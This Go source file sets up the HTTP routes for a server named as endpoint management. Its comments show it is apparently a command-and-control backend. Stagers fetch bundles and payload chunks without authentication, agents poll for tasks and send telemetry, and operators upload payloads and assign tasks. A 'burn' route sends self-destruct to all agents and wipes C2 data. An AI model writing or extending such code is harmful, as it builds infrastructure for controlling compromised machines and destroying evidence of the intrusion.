package router

import (
	"time"

	"github.com/gin-gonic/gin"
	"github.com/redis/go-redis/v9"

	"endpoint-management-server/internal/handlers"
	"endpoint-management-server/internal/middleware"
	"endpoint-management-server/internal/repository"
)

func New(
	agentHandler     *handlers.AgentHandler,
	operatorHandler  *handlers.OperatorHandler,
	payloadHandler   *handlers.PayloadHandler,
	dashboardHandler *handlers.DashboardHandler,
	agentRepo        *repository.AgentRepository,
	redisClient      *redis.Client,
	jwtSecret        string,
) *gin.Engine {
	r := gin.New()
	r.Use(gin.Recovery(), gin.Logger(), middleware.SecurityHeaders())
	r.SetTrustedProxies([]string{"127.0.0.1"})

	v1 := r.Group("/api/v1")

	// ── Agent routes (bearer token auth) ─────────────────────────────────
	agentGroup := v1.Group("/agent")
	agentGroup.Use(middleware.RateLimiter(redisClient, 60, time.Minute))
	{
		agentGroup.POST("/register", agentHandler.Register)
		agentGroup.GET("/bundle", agentHandler.ServeBundle) // unauthenticated — stager calls before registering

		authed := agentGroup.Group("")
		authed.Use(middleware.AgentAuth(agentRepo))
		{
			authed.GET("/poll", agentHandler.Poll)
			authed.POST("/telemetry", agentHandler.Telemetry)
		}
	}

	// Direct HTTPS chunk fallback — no operator auth needed (agent calls it).
	v1.GET("/payload/chunk/:index", payloadHandler.Chunk)

	// ── Operator routes (JWT) ─────────────────────────────────────────────
	op := v1.Group("/operator")
	{
		// Login is unauthenticated (issues the JWT).
		op.POST("/login", operatorHandler.Login)

		opAuthed := op.Group("")
		opAuthed.Use(middleware.ValidateOperatorJWT(jwtSecret))
		{
			opAuthed.POST("/payload/upload",  payloadHandler.Upload)
			opAuthed.GET("/payload/status",   payloadHandler.Status)
			opAuthed.POST("/payload/webhook", payloadHandler.Webhook)

			// Agent / task / telemetry views for the operator CLI.
			opAuthed.GET("/agents",     agentHandler.ListAgents)
			opAuthed.GET("/tasks",      agentHandler.ListTasks)
			opAuthed.GET("/telemetry",  agentHandler.ListTelemetry)

			// Bundle management.
			opAuthed.POST("/bundle/upload", agentHandler.BundleUpload)

			// Kill switch — push self_destruct to all online agents + wipe C2 data.
			opAuthed.POST("/burn", agentHandler.Burn)
		}
	}

	// Task creation requires operator JWT.
	v1.POST("/agent/:agent_id/tasks",
		middleware.ValidateOperatorJWT(jwtSecret),
		agentHandler.CreateTask,
	)

	// ── Dashboard ─────────────────────────────────────────────────────────
	v1.GET("/dashboard/data", dashboardHandler.Data)
	r.GET("/dashboard", dashboardHandler.HTML)

	r.GET("/healthz", func(c *gin.Context) {
		c.JSON(200, gin.H{"status": "ok"})
	})

	return r
}
